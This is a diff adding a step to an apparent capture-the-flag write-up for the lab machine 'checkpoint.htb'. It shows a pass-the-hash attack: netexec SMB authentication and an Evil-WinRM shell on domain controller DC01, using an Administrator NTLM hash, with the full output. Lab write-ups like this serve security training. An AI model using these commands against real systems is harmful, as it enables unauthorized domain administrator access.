@@ -1370,4 +1370,26 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:28f8d934dee90b2ec824351c
 ```
 
 
+``` bash
+
+❯ nxc smb 10.129.113.22 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
+
+SMB         10.129.113.22   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.113.22   445    DC01             [+] checkpoint.htb\Administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
+❯ evil-winrm -i 10.129.113.22 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+checkpoint\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+```
+
+
 
